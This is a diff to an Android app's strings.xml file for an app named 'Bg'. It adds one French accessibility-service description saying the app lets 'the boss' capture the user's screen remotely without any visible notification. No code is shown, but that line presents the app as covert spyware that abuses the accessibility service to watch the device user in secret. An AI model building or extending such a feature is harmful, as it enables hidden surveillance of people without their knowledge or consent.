@@ -1,4 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
     <string name="app_name">Bg</string>
+    <string name="accessibility_service_description">Permet au boss de capturer votre écran à distance, sans notification visible.</string>
 </resources>
